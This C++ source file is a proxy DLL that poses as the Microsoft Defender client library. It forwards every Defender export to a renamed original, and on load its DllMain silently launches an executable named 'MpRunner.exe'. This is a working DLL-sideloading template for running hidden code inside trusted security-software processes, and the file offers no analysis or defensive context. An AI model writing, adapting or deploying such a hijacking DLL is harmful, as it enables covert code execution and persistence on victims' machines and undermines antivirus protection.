#include <winternl.h>
#include <windows.h>

#pragma comment(linker, "/export:MpAddDynamicSignatureFile=MpUser.MpAddDynamicSignatureFile")
#pragma comment(linker, "/export:MpAllocMemory=MpUser.MpAllocMemory")
#pragma comment(linker, "/export:MpAmsiCloseSession=MpUser.MpAmsiCloseSession")
#pragma comment(linker, "/export:MpAmsiScan=MpUser.MpAmsiScan")
#pragma comment(linker, "/export:MpCleanControl=MpUser.MpCleanControl")
#pragma comment(linker, "/export:MpCleanOpen=MpUser.MpCleanOpen")
#pragma comment(linker, "/export:MpCleanPrecheckStart=MpUser.MpCleanPrecheckStart")
#pragma comment(linker, "/export:MpCleanStart=MpUser.MpCleanStart")
#pragma comment(linker, "/export:MpClientUtilExportFunctions=MpUser.MpClientUtilExportFunctions")
#pragma comment(linker, "/export:MpClose=MpUser.MpClose")
#pragma comment(linker, "/export:MpConfigClose=MpUser.MpConfigClose")
#pragma comment(linker, "/export:MpConfigDelValue=MpUser.MpConfigDelValue")
#pragma comment(linker, "/export:MpConfigGetValue=MpUser.MpConfigGetValue")
#pragma comment(linker, "/export:MpConfigGetValueAlloc=MpUser.MpConfigGetValueAlloc")
#pragma comment(linker, "/export:MpConfigInitialize=MpUser.MpConfigInitialize")
#pragma comment(linker, "/export:MpConfigIteratorClose=MpUser.MpConfigIteratorClose")
#pragma comment(linker, "/export:MpConfigIteratorEnum=MpUser.MpConfigIteratorEnum")
#pragma comment(linker, "/export:MpConfigIteratorOpen=MpUser.MpConfigIteratorOpen")
#pragma comment(linker, "/export:MpConfigOpen=MpUser.MpConfigOpen")
#pragma comment(linker, "/export:MpConfigRegisterForNotifications=MpUser.MpConfigRegisterForNotifications")
#pragma comment(linker, "/export:MpConfigSetValue=MpUser.MpConfigSetValue")
#pragma comment(linker, "/export:MpConfigUninitialize=MpUser.MpConfigUninitialize")
#pragma comment(linker, "/export:MpConfigUnregisterNotifications=MpUser.MpConfigUnregisterNotifications")
#pragma comment(linker, "/export:MpConveyDlpBypass=MpUser.MpConveyDlpBypass")
#pragma comment(linker, "/export:MpConveySampleSubmissionResult=MpUser.MpConveySampleSubmissionResult")
#pragma comment(linker, "/export:MpConveyUserChoiceForSampleList=MpUser.MpConveyUserChoiceForSampleList")
#pragma comment(linker, "/export:MpCreateComInstance=MpUser.MpCreateComInstance")
#pragma comment(linker, "/export:MpDbgAllocMemory=MpUser.MpDbgAllocMemory")
#pragma comment(linker, "/export:MpDebugExportFunctions=MpUser.MpDebugExportFunctions")
#pragma comment(linker, "/export:MpDeleteAsrHistory=MpUser.MpDeleteAsrHistory")
#pragma comment(linker, "/export:MpDetectionEnumerate=MpUser.MpDetectionEnumerate")
#pragma comment(linker, "/export:MpDetectionQuery=MpUser.MpDetectionQuery")
#pragma comment(linker, "/export:MpDynamicSignatureEnumerate=MpUser.MpDynamicSignatureEnumerate")
#pragma comment(linker, "/export:MpDynamicSignatureOpen=MpUser.MpDynamicSignatureOpen")
#pragma comment(linker, "/export:MpElevateCleanHandle=MpUser.MpElevateCleanHandle")
#pragma comment(linker, "/export:MpElevationHandleAcquire=MpUser.MpElevationHandleAcquire")
#pragma comment(linker, "/export:MpElevationHandleActivate=MpUser.MpElevationHandleActivate")
#pragma comment(linker, "/export:MpElevationHandleAttach=MpUser.MpElevationHandleAttach")
#pragma comment(linker, "/export:MpElevationHandleOpen=MpUser.MpElevationHandleOpen")
#pragma comment(linker, "/export:MpErrorMessageFormat=MpUser.MpErrorMessageFormat")
#pragma comment(linker, "/export:MpFastMemoryScan=MpUser.MpFastMemoryScan")
#pragma comment(linker, "/export:MpFastMemoryScanOpen=MpUser.MpFastMemoryScanOpen")
#pragma comment(linker, "/export:MpFlushLowfiCache=MpUser.MpFlushLowfiCache")
#pragma comment(linker, "/export:MpForcedReboot=MpUser.MpForcedReboot")
#pragma comment(linker, "/export:MpFreeMemory=MpUser.MpFreeMemory")
#pragma comment(linker, "/export:MpGenerateSignature=MpUser.MpGenerateSignature")
#pragma comment(linker, "/export:MpGenerateSignatureEx=MpUser.MpGenerateSignatureEx")
#pragma comment(linker, "/export:MpGenerateThreatReport=MpUser.MpGenerateThreatReport")
#pragma comment(linker, "/export:MpGetAsrBlockedActionInfos=MpUser.MpGetAsrBlockedActionInfos")
#pragma comment(linker, "/export:MpGetAsrBlockedActions=MpUser.MpGetAsrBlockedActions")
#pragma comment(linker, "/export:MpGetAsrBlockedProcesses=MpUser.MpGetAsrBlockedProcesses")
#pragma comment(linker, "/export:MpGetCallistoDetections=MpUser.MpGetCallistoDetections")
#pragma comment(linker, "/export:MpGetDevMode=MpUser.MpGetDevMode")
#pragma comment(linker, "/export:MpGetEngineVersion=MpUser.MpGetEngineVersion")
#pragma comment(linker, "/export:MpGetHIPSRuleInfo=MpUser.MpGetHIPSRuleInfo")
#pragma comment(linker, "/export:MpGetMAPSConnectivityStatusInfo=MpUser.MpGetMAPSConnectivityStatusInfo")
#pragma comment(linker, "/export:MpGetRunningMode=MpUser.MpGetRunningMode")
#pragma comment(linker, "/export:MpGetSampleChunk=MpUser.MpGetSampleChunk")
#pragma comment(linker, "/export:MpGetSampleListRequiringConsent=MpUser.MpGetSampleListRequiringConsent")
#pragma comment(linker, "/export:MpGetTPStateInfo=MpUser.MpGetTPStateInfo")
#pragma comment(linker, "/export:MpGetTaskSchedulerStrings=MpUser.MpGetTaskSchedulerStrings")
#pragma comment(linker, "/export:MpHandleClose=MpUser.MpHandleClose")
#pragma comment(linker, "/export:MpIsGivenRunningModeSupported=MpUser.MpIsGivenRunningModeSupported")
#pragma comment(linker, "/export:MpIsRtpAutoEnable=MpUser.MpIsRtpAutoEnable")
#pragma comment(linker, "/export:MpManagerDisable=MpUser.MpManagerDisable")
#pragma comment(linker, "/export:MpManagerEnable=MpUser.MpManagerEnable")
#pragma comment(linker, "/export:MpManagerOpen=MpUser.MpManagerOpen")
#pragma comment(linker, "/export:MpManagerStatusQuery=MpUser.MpManagerStatusQuery")
#pragma comment(linker, "/export:MpManagerStatusQueryEx=MpUser.MpManagerStatusQueryEx")
#pragma comment(linker, "/export:MpManagerVersionQuery=MpUser.MpManagerVersionQuery")
#pragma comment(linker, "/export:MpManagerXBGMDisable=MpUser.MpManagerXBGMDisable")
#pragma comment(linker, "/export:MpManagerXBGMEnable=MpUser.MpManagerXBGMEnable")
#pragma comment(linker, "/export:MpMemoryScanStart=MpUser.MpMemoryScanStart")
#pragma comment(linker, "/export:MpNetworkCapture=MpUser.MpNetworkCapture")
#pragma comment(linker, "/export:MpNotificationRegister=MpUser.MpNotificationRegister")
#pragma comment(linker, "/export:MpOfflineScanInstall=MpUser.MpOfflineScanInstall")
#pragma comment(linker, "/export:MpOfflineScanStatusQuery=MpUser.MpOfflineScanStatusQuery")
#pragma comment(linker, "/export:MpOpen=MpUser.MpOpen")
#pragma comment(linker, "/export:MpProductGenuineCheck=MpUser.MpProductGenuineCheck")
#pragma comment(linker, "/export:MpQuarantineRequest=MpUser.MpQuarantineRequest")
#pragma comment(linker, "/export:MpQueryDefaultFolderGuardList=MpUser.MpQueryDefaultFolderGuardList")
#pragma comment(linker, "/export:MpQueryEngineConfigDword=MpUser.MpQueryEngineConfigDword")
#pragma comment(linker, "/export:MpQueryFileTrustByHandle=MpUser.MpQueryFileTrustByHandle")
#pragma comment(linker, "/export:MpRemapCallistoDetections=MpUser.MpRemapCallistoDetections")
#pragma comment(linker, "/export:MpRemoveDynamicSignatureFile=MpUser.MpRemoveDynamicSignatureFile")
#pragma comment(linker, "/export:MpRequestSnooze=MpUser.MpRequestSnooze")
#pragma comment(linker, "/export:MpSampleQuery=MpUser.MpSampleQuery")
#pragma comment(linker, "/export:MpSampleSubmit=MpUser.MpSampleSubmit")
#pragma comment(linker, "/export:MpScanControl=MpUser.MpScanControl")
#pragma comment(linker, "/export:MpScanResult=MpUser.MpScanResult")
#pragma comment(linker, "/export:MpScanStart=MpUser.MpScanStart")
#pragma comment(linker, "/export:MpScanStartEx=MpUser.MpScanStartEx")
#pragma comment(linker, "/export:MpSetBreakTheGlassStatus=MpUser.MpSetBreakTheGlassStatus")
#pragma comment(linker, "/export:MpSetTPState=MpUser.MpSetTPState")
#pragma comment(linker, "/export:MpSetUacElevationDefaultWindowHandle=MpUser.MpSetUacElevationDefaultWindowHandle")
#pragma comment(linker, "/export:MpSmartLockerEnable=MpUser.MpSmartLockerEnable")
#pragma comment(linker, "/export:MpTelemetryAddToAverageDWORD=MpUser.MpTelemetryAddToAverageDWORD")
#pragma comment(linker, "/export:MpTelemetryAddToStreamDWORD=MpUser.MpTelemetryAddToStreamDWORD")
#pragma comment(linker, "/export:MpTelemetryAddToStreamDWORD64=MpUser.MpTelemetryAddToStreamDWORD64")
#pragma comment(linker, "/export:MpTelemetryAddToStreamString=MpUser.MpTelemetryAddToStreamString")
#pragma comment(linker, "/export:MpTelemetryIncrementDWORD=MpUser.MpTelemetryIncrementDWORD")
#pragma comment(linker, "/export:MpTelemetryInitialize=MpUser.MpTelemetryInitialize")
#pragma comment(linker, "/export:MpTelemetryIsOptIn=MpUser.MpTelemetryIsOptIn")
#pragma comment(linker, "/export:MpTelemetryLiteralAddToAverageDWORD=MpUser.MpTelemetryLiteralAddToAverageDWORD")
#pragma comment(linker, "/export:MpTelemetryLiteralAddToStreamDWORD=MpUser.MpTelemetryLiteralAddToStreamDWORD")
#pragma comment(linker, "/export:MpTelemetryLiteralAddToStreamDWORD64=MpUser.MpTelemetryLiteralAddToStreamDWORD64")
#pragma comment(linker, "/export:MpTelemetryLiteralAddToStreamString=MpUser.MpTelemetryLiteralAddToStreamString")
#pragma comment(linker, "/export:MpTelemetryLiteralIncrementDWORD=MpUser.MpTelemetryLiteralIncrementDWORD")
#pragma comment(linker, "/export:MpTelemetryLiteralSetDWORD=MpUser.MpTelemetryLiteralSetDWORD")
#pragma comment(linker, "/export:MpTelemetryLiteralSetDWORD64=MpUser.MpTelemetryLiteralSetDWORD64")
#pragma comment(linker, "/export:MpTelemetryLiteralSetIfMaxDWORD=MpUser.MpTelemetryLiteralSetIfMaxDWORD")
#pragma comment(linker, "/export:MpTelemetryLiteralSetIfMinDWORD=MpUser.MpTelemetryLiteralSetIfMinDWORD")
#pragma comment(linker, "/export:MpTelemetryLiteralSetString=MpUser.MpTelemetryLiteralSetString")
#pragma comment(linker, "/export:MpTelemetrySetConsent=MpUser.MpTelemetrySetConsent")
#pragma comment(linker, "/export:MpTelemetrySetDWORD=MpUser.MpTelemetrySetDWORD")
#pragma comment(linker, "/export:MpTelemetrySetDWORD64=MpUser.MpTelemetrySetDWORD64")
#pragma comment(linker, "/export:MpTelemetrySetIfMaxDWORD=MpUser.MpTelemetrySetIfMaxDWORD")
#pragma comment(linker, "/export:MpTelemetrySetIfMinDWORD=MpUser.MpTelemetrySetIfMinDWORD")
#pragma comment(linker, "/export:MpTelemetrySetString=MpUser.MpTelemetrySetString")
#pragma comment(linker, "/export:MpTelemetryUninitialize=MpUser.MpTelemetryUninitialize")
#pragma comment(linker, "/export:MpTelemetryUpdateUserConsent=MpUser.MpTelemetryUpdateUserConsent")
#pragma comment(linker, "/export:MpTelemetryUpload=MpUser.MpTelemetryUpload")
#pragma comment(linker, "/export:MpThreatEnumerate=MpUser.MpThreatEnumerate")
#pragma comment(linker, "/export:MpThreatHistoryRequest=MpUser.MpThreatHistoryRequest")
#pragma comment(linker, "/export:MpThreatLocalizedInfoQuery=MpUser.MpThreatLocalizedInfoQuery")
#pragma comment(linker, "/export:MpThreatOpen=MpUser.MpThreatOpen")
#pragma comment(linker, "/export:MpThreatQuery=MpUser.MpThreatQuery")
#pragma comment(linker, "/export:MpThreatRollup=MpUser.MpThreatRollup")
#pragma comment(linker, "/export:MpTriggerErrorHeartbeatReport=MpUser.MpTriggerErrorHeartbeatReport")
#pragma comment(linker, "/export:MpTriggerHeartbeatOnUninstall=MpUser.MpTriggerHeartbeatOnUninstall")
#pragma comment(linker, "/export:MpTriggerStatusRefreshNotification=MpUser.MpTriggerStatusRefreshNotification")
#pragma comment(linker, "/export:MpUpdateControl=MpUser.MpUpdateControl")
#pragma comment(linker, "/export:MpUpdateDevMode=MpUser.MpUpdateDevMode")
#pragma comment(linker, "/export:MpUpdateEngine=MpUser.MpUpdateEngine")
#pragma comment(linker, "/export:MpUpdatePlatform=MpUser.MpUpdatePlatform")
#pragma comment(linker, "/export:MpUpdateStart=MpUser.MpUpdateStart")
#pragma comment(linker, "/export:MpUpdateStartEx=MpUser.MpUpdateStartEx")
#pragma comment(linker, "/export:MpUtilsExportFunctions=MpUser.MpUtilsExportFunctions")
#pragma comment(linker, "/export:MpWDEnable=MpUser.MpWDEnable")
#pragma comment(linker, "/export:MpXBGMEnable=MpUser.MpXBGMEnable")
#pragma comment(linker, "/export:MpXBGMFreeEvent=MpUser.MpXBGMFreeEvent")
#pragma comment(linker, "/export:MpXBGMGetData=MpUser.MpXBGMGetData")
#pragma comment(linker, "/export:MpXBGMPutData=MpUser.MpXBGMPutData")
#pragma comment(linker, "/export:MpXBGMUpdateIV=MpUser.MpXBGMUpdateIV")
#pragma comment(linker, "/export:MputAddToAverageDWORD64Rpc=MpUser.MputAddToAverageDWORD64Rpc")
#pragma comment(linker, "/export:MputAddToAverageDWORDRpc=MpUser.MputAddToAverageDWORDRpc")
#pragma comment(linker, "/export:MputIncrementDWORD64Rpc=MpUser.MputIncrementDWORD64Rpc")
#pragma comment(linker, "/export:MputIncrementDWORDRpc=MpUser.MputIncrementDWORDRpc")
#pragma comment(linker, "/export:MputSetBoolRpc=MpUser.MputSetBoolRpc")
#pragma comment(linker, "/export:MputSetDWORD64Rpc=MpUser.MputSetDWORD64Rpc")
#pragma comment(linker, "/export:MputSetDWORDRpc=MpUser.MputSetDWORDRpc")
#pragma comment(linker, "/export:MputSetIfMaxDWORD64Rpc=MpUser.MputSetIfMaxDWORD64Rpc")
#pragma comment(linker, "/export:MputSetIfMaxDWORDRpc=MpUser.MputSetIfMaxDWORDRpc")
#pragma comment(linker, "/export:MputSetIfMinDWORD64Rpc=MpUser.MputSetIfMinDWORD64Rpc")
#pragma comment(linker, "/export:MputSetIfMinDWORDRpc=MpUser.MputSetIfMinDWORDRpc")
#pragma comment(linker, "/export:MputSetStringRpc=MpUser.MputSetStringRpc")
#pragma comment(linker, "/export:WDEnable=MpUser.WDEnable")
#pragma comment(linker, "/export:WDStatus=MpUser.WDStatus")


extern "C" __declspec(dllexport) int run(void) {
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));

	si.cb = sizeof(si);
	CreateProcessW(L"MpRunner.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, reinterpret_cast<LPSTARTUPINFOW>(&si), &pi);


	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {

	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		run();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}